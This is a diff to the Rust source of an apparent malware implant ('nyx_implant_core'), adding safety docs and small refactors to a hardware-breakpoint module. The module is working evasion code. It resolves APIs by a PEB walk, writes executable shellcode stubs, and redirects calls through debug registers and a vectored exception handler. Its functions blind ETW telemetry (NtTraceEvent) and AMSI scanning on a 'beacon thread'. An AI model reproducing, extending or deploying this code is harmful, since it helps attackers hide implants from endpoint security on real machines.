@@ -318,6 +318,14 @@ unsafe fn diag_append_byte(path: *const u16, ch: u8, cf: usize, wf: usize, ch_: 
 
 // ---- INIT ----------------------------------------------------------------
 
+/// Allocate and publish the shadow-stub page (RW write → RX downgrade), once
+/// per process. Idempotent: returns true immediately if already initialized.
+/// Returns false if the page allocation fails.
+///
+/// # Safety
+/// Resolves `VirtualAlloc` via the PEB walk and writes machine-code stubs
+/// into the freshly-allocated page. No caller preconditions beyond running in
+/// a live process with kernelbase/kernel32 resolvable.
 pub unsafe fn init_shadow_buffer() -> bool {
     // Fast path: already initialized this process. Acquire so we see the
     // fully-written, RX-downgraded stubs if we observe a non-null base.
@@ -341,12 +349,8 @@ pub unsafe fn init_shadow_buffer() -> bool {
 /// Resolve VirtualAlloc and allocate a single 0x1000-byte page as
 /// PAGE_READWRITE for the shadow stubs. Returns null if unavailable.
 unsafe fn alloc_shadow_page() -> Option<*mut u8> {
-    let addr = match nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
-        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
-    {
-        Some(a) => a,
-        None => return None,
-    };
+    let addr = nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
+        .or_else(|| nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))?;
     type VAlloc = unsafe extern "system" fn(
         *mut core::ffi::c_void,
         usize,
@@ -417,25 +421,6 @@ unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
 
 // ---- VEH HANDLER ---------------------------------------------------------
 
-/// Vectored Exception Handler for HWBP interception.
-///
-/// Pattern (RF-based, single-phase):
-/// - CPU hits DR0 execute breakpoint → #DB → EXCEPTION_SINGLE_STEP
-/// - VEH fires: check DR6.B0–B3 to confirm which slot triggered
-/// - If match: set RIP = shadow stub, set RF (bit 16) to skip breakpoint
-///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
-/// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
-/// - Next call to the target fires the HWBP again (RF was one-shot)
-///
-/// CRITICAL-7 fix: this handler is **lock-free**. It never returns
-/// `EXCEPTION_CONTINUE_SEARCH` because it failed to acquire state; it returns
-/// `SEARCH` only for genuinely foreign exceptions (null pointers,
-/// non-`STATUS_SINGLE_STEP` codes, no DR6 B-bits, or a B-bit whose slot is
-/// not armed at this faulting address). The last case — a #DB on a slot we
-/// are no longer interested in, or never armed — is the OS's job to keep
-/// searching; if no other handler wants it, that is correct behavior (e.g. a
-/// debugger's HWBP).
-
 /// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
 /// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
 unsafe fn vehtag(ch: u8) {
@@ -457,6 +442,11 @@ unsafe fn vehtag(ch: u8) {
 }
 
 /// Read VEH_DIAG_BUF contents (for post-mortem inspection).
+///
+/// # Safety
+/// Copies the 128-byte static diag buffer out by value; may race a concurrent
+/// VEH write — the result is best-effort post-mortem data, not a consistent
+/// snapshot.
 pub unsafe fn read_veh_diag() -> [u8; 128] {
     // SAFETY: VEH_DIAG_BUF is a 128-byte static; we copy it out by value.
     // Concurrent writers (the VEH) may race, but the buffer is documented as
@@ -464,6 +454,29 @@ pub unsafe fn read_veh_diag() -> [u8; 128] {
     core::ptr::read(VEH_DIAG_BUF.get())
 }
 
+/// Vectored Exception Handler for HWBP interception.
+///
+/// Pattern (RF-based, single-phase):
+/// - CPU hits DR0 execute breakpoint → #DB → EXCEPTION_SINGLE_STEP
+/// - VEH fires: check DR6.B0–B3 to confirm which slot triggered
+/// - If match: set RIP = shadow stub, set RF (bit 16) to skip breakpoint
+///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
+/// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
+/// - Next call to the target fires the HWBP again (RF was one-shot)
+///
+/// CRITICAL-7 fix: this handler is **lock-free**. It never returns
+/// `EXCEPTION_CONTINUE_SEARCH` because it failed to acquire state; it returns
+/// `SEARCH` only for genuinely foreign exceptions (null pointers,
+/// non-`STATUS_SINGLE_STEP` codes, no DR6 B-bits, or a B-bit whose slot is
+/// not armed at this faulting address). The last case — a #DB on a slot we
+/// are no longer interested in, or never armed — is the OS's job to keep
+/// searching; if no other handler wants it, that is correct behavior (e.g. a
+/// debugger's HWBP).
+///
+/// # Safety
+/// Invoked by the OS vectored-exception dispatcher with `ep` pointing at a
+/// live `EXCEPTION_POINTERS`. Only registered via `AddVectoredExceptionHandler`
+/// from this module; must never be called from Rust code directly.
 #[no_mangle]
 pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
@@ -727,7 +740,13 @@ unsafe fn resolve_add_veh() -> Option<
             return None;
         }
     };
-    Some(core::mem::transmute(add_addr))
+    Some(core::mem::transmute::<
+        usize,
+        unsafe extern "system" fn(
+            usize,
+            unsafe extern "system" fn(usize) -> i32,
+        ) -> *mut core::ffi::c_void,
+    >(add_addr))
 }
 
 /// Resolve RemoveVectoredExceptionHandler. On failure, marks the chain unsafe
@@ -747,7 +766,10 @@ unsafe fn resolve_remove_veh() -> Option<unsafe extern "system" fn(*mut core::ff
             return None;
         }
     };
-    Some(core::mem::transmute(rm_addr))
+    Some(core::mem::transmute::<
+        usize,
+        unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
+    >(rm_addr))
 }
 
 /// Register the transient probe handler at the front of the chain and remove
@@ -801,8 +823,8 @@ unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
 /// error string if all four slots are already armed/in-use. Uses a CAS so two
 /// concurrent armers never grab the same slot.
 fn claim_slot() -> Result<usize, &'static str> {
-    for i in 0..4usize {
-        if HWBP_SLOT_STATE[i]
+    for (i, slot) in HWBP_SLOT_STATE.iter().enumerate() {
+        if slot
             .compare_exchange(
                 SLOT_VACANT,
                 SLOT_CLAIMED,
@@ -817,40 +839,37 @@ fn claim_slot() -> Result<usize, &'static str> {
     Err("all 4 DR slots full")
 }
 
-/// Set a hardware breakpoint on `target_addr` using the given shadow type.
-///
-/// Uses `NtGetContextThread` / `NtSetContextThread(NT_CURRENT_THREAD, ctx)`
-/// with `CONTEXT_DEBUG_REGISTERS` for the set call.
-///
-/// Returns the DR slot index (0–3) on success.
-///
-/// # Arming protocol (CRITICAL-6/7)
-///
-/// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH handles a #DB on a
-///    CLAIMED slot with a DR6 clear + Resume Flag (it is ours — the register
-///    gets armed below — and must not be passed through unhandled).
-/// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
-/// 3. Register the VEH if not already registered (once, before any DR write).
-/// 4. Arm the DR register via NtSetContextThread.
-/// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
-///    Release ordering. Only AFTER this point can the VEH redirect on the slot.
-///
-/// The DR bit is set BEFORE the slot is published. If a #DB fires between
-/// arming and publishing, the VEH sees CLAIMED and handles it as a benign
-/// one-shot (clear DR6 + set RF, no redirect): the target instruction executes
-/// once, and the next execution re-traps — by then the slot is OCCUPIED and
-/// the VEH redirects. We never publish a slot whose DR bit isn't already set,
-/// so the VEH never observes an armed-but-unpublished slot as vacant.
+// Set a hardware breakpoint on `target_addr` using the given shadow type.
+//
+// Uses `NtGetContextThread` / `NtSetContextThread(NT_CURRENT_THREAD, ctx)`
+// with `CONTEXT_DEBUG_REGISTERS` for the set call.
+//
+// Returns the DR slot index (0–3) on success.
+//
+// # Arming protocol (CRITICAL-6/7)
+//
+// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH handles a #DB on a
+//    CLAIMED slot with a DR6 clear + Resume Flag (it is ours — the register
+//    gets armed below — and must not be passed through unhandled).
+// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
+// 3. Register the VEH if not already registered (once, before any DR write).
+// 4. Arm the DR register via NtSetContextThread.
+// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
+//    Release ordering. Only AFTER this point can the VEH redirect on the slot.
+//
+// The DR bit is set BEFORE the slot is published. If a #DB fires between
+// arming and publishing, the VEH sees CLAIMED and handles it as a benign
+// one-shot (clear DR6 + set RF, no redirect): the target instruction executes
+// once, and the next execution re-traps — by then the slot is OCCUPIED and
+// the VEH redirects. We never publish a slot whose DR bit isn't already set,
+// so the VEH never observes an armed-but-unpublished slot as vacant.
 // ── add_hwbp helpers ───────────────────────────────────────────────────────
 
+/// NtGetContextThread / NtSetContextThread share this signature.
+type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
+
 /// Resolve NtGetContextThread and NtSetContextThread.
-unsafe fn resolve_nt_context_fns() -> Result<
-    (
-        unsafe extern "system" fn(usize, usize) -> i32,
-        unsafe extern "system" fn(usize, usize) -> i32,
-    ),
-    &'static str,
-> {
+unsafe fn resolve_nt_context_fns() -> Result<(FnCtx, FnCtx), &'static str> {
     let ntgct_addr =
         match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
             Some(a) => a,
@@ -862,8 +881,8 @@ unsafe fn resolve_nt_context_fns() -> Result<
             None => return Err("NtSetContextThread unresolved"),
         };
     Ok((
-        core::mem::transmute(ntgct_addr),
-        core::mem::transmute(ntsct_addr),
+        core::mem::transmute::<usize, FnCtx>(ntgct_addr),
+        core::mem::transmute::<usize, FnCtx>(ntsct_addr),
     ))
 }
 
@@ -1003,21 +1022,21 @@ unsafe fn configure_dr_slot(
 /// Returns the 0-based DR slot number (0–3) on success.
 /// Returns `Err` if no free slot, the VEH chain is compromised, or any
 /// NT API call fails. The caller must call [`remove_hwbp`] to disarm.
+///
+/// # Safety
+/// Arms a DR debug register on the CURRENT thread via `NtSetContextThread`
+/// and registers this module's VEH. Call only from the thread whose
+/// execution of `target_addr` should be redirected (the beacon thread); the
+/// shadow buffer must be initialized ([`init_shadow_buffer`]).
 pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<usize, &'static str> {
     diag(b'a');
 
     // 0. Preconditions.
-    let shadow = match resolve_shadow_for_arm(shadow_type) {
-        Ok(s) => s,
-        Err(e) => return Err(e),
-    };
+    let shadow = resolve_shadow_for_arm(shadow_type)?;
     diag(b'b');
 
     // 1. Claim a free HWBP slot.
-    let slot = match claim_hwbp_slot() {
-        Ok(s) => s,
-        Err(e) => return Err(e),
-    };
+    let slot = claim_hwbp_slot()?;
     diag(b'c');
 
     // 2. Resolve NT context functions.
@@ -1151,6 +1170,11 @@ unsafe fn arm_and_publish_slot(
 /// `remove_hwbp`. The CAS + disarm-first sequence makes the teardown safe
 /// even if that assumption is ever violated by a global-enable (G bit)
 /// breakpoint.
+///
+/// # Safety
+/// Writes the DR debug registers of the CURRENT thread via
+/// `NtSetContextThread`. Call only from the thread that armed `slot`
+/// (the beacon thread); `slot` must have been returned by [`add_hwbp`].
 pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     if slot >= 4 {
         return Err("invalid slot");
@@ -1255,22 +1279,15 @@ unsafe fn alloc_disarm_ctx_buf() -> Result<*mut core::ffi::c_void, (u8, &'static
 
 /// Resolve NtGetContextThread / NtSetContextThread for disarming. Returns
 /// Err((diag_tag, msg)) on failure.
-unsafe fn resolve_disarm_ctx_fns() -> Result<
-    (
-        unsafe extern "system" fn(usize, usize) -> i32,
-        unsafe extern "system" fn(usize, usize) -> i32,
-    ),
-    (u8, &'static str),
-> {
-    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
+unsafe fn resolve_disarm_ctx_fns() -> Result<(FnCtx, FnCtx), (u8, &'static str)> {
     let ntgct: FnCtx =
         match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
-            Some(a) => core::mem::transmute(a),
+            Some(a) => core::mem::transmute::<usize, FnCtx>(a),
             None => return Err((b'G', "NtGetContextThread unresolved")),
         };
     let ntsct: FnCtx =
         match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
-            Some(a) => core::mem::transmute(a),
+            Some(a) => core::mem::transmute::<usize, FnCtx>(a),
             None => return Err((b'S', "NtSetContextThread unresolved")),
         };
     Ok((ntgct, ntsct))
@@ -1375,6 +1392,9 @@ pub fn is_veh_safe() -> bool {
 }
 
 /// Set HWBP on `ntdll!NtTraceEvent` → shadow returns 0 (ETW suppressed).
+///
+/// # Safety
+/// Arms an execute HWBP on the current thread — see [`add_hwbp`].
 pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
     let addr = nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
         .ok_or("NtTraceEvent unresolved")?;
@@ -1382,6 +1402,9 @@ pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
 }
 
 /// Set HWBP on `amsi!AmsiScanBuffer` → shadow returns E_INVALIDARG (AMSI suppressed).
+///
+/// # Safety
+/// Arms an execute HWBP on the current thread — see [`add_hwbp`].
 pub unsafe fn blind_amsi_hwbp() -> Result<usize, &'static str> {
     let addr = nyx_implant_core::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer")
         .ok_or("amsi not loaded")?;
